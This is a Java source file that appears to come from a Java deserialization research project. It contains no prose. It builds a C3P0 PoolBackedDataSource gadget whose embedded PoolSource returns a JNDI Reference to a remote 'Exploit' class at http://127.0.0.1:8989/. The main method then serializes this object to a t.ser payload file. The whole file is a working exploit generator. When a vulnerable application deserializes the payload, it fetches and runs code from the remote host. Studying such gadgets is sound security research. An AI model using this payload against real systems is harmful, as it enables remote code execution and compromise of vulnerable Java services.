package C3P0;

import com.mchange.v2.c3p0.PoolBackedDataSource;
import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;

/**
 * @author tr1ple
 */
public class payload1 {
    private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {
        private String className;
        private String url;

        public PoolSource(String className, String url) {
            this.className = className;
            this.url = url;
        }

        @Override
        public Reference getReference() throws NamingException {
            return new Reference("exploit", this.className, this.url);
        }

        @Override
        public PooledConnection getPooledConnection() throws SQLException {
            return null;
        }

        @Override
        public PooledConnection getPooledConnection(String user, String password) throws SQLException {
            return null;
        }

        @Override
        public PrintWriter getLogWriter() throws SQLException {
            return null;
        }

        @Override
        public void setLogWriter(PrintWriter out) throws SQLException {

        }

        @Override
        public void setLoginTimeout(int seconds) throws SQLException {

        }

        @Override
        public int getLoginTimeout() throws SQLException {
            return 0;
        }

        @Override
        public Logger getParentLogger() throws SQLFeatureNotSupportedException {
            return null;
        }
    }
        public static void main(String[] args) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchFieldException, IOException {
            Constructor con = PoolBackedDataSource.class.getDeclaredConstructor(new Class[0]);
            con.setAccessible(true);
            PoolBackedDataSource obj = (PoolBackedDataSource) con.newInstance(new Object[0]);
            Field conData = PoolBackedDataSourceBase.class.getDeclaredField("connectionPoolDataSource");
            conData.setAccessible(true);
            conData.set(obj, new PoolSource("Exploit", "http://127.0.0.1:8989/"));
            ObjectOutputStream objOut = new ObjectOutputStream(new FileOutputStream(System.getProperty("user.dir")+"/javasec-ysoserial/src/main/resources/t.ser"));
            objOut.writeObject(obj);
        }


    }

